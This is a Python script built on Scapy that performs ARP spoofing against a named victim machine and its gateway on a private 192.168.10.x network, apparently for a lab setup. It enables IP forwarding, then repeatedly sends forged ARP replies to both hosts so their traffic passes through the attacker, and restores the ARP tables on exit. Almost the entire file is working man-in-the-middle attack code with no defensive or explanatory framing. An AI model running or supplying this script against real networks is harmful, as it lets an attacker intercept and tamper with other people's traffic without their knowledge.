from scapy.all import *
import os
import time

# The IP of the victim (Ubuntu) and the gateway
victim_ip = "192.168.10.11"
gateway_ip = "192.168.10.2"
interface = "eth0"

# Enable IP forwarding
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def get_mac(ip):
    # Send ARP request to get the MAC address of a given IP
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def spoof(target_ip, spoof_ip):
    # Send ARP reply to target to spoof its ARP cache
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"Failed to get MAC address for {target_ip}")
        return

    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=get_if_hwaddr(interface))
    send(packet, verbose=True)

def restore(destination_ip, source_ip):
    # Restore the original MAC address in the ARP table
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac is None or source_mac is None:
        print(f"Failed to get MAC address for {destination_ip} or {source_ip}")
        return

    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=True)

try:
    print("Starting ARP spoofing. Press Ctrl+C to stop.")
    while True:
        spoof(victim_ip, gateway_ip)
        spoof(gateway_ip, victim_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("Restoring network...")
    restore(victim_ip, gateway_ip)
    restore(gateway_ip, victim_ip)
    print("Network restored.")
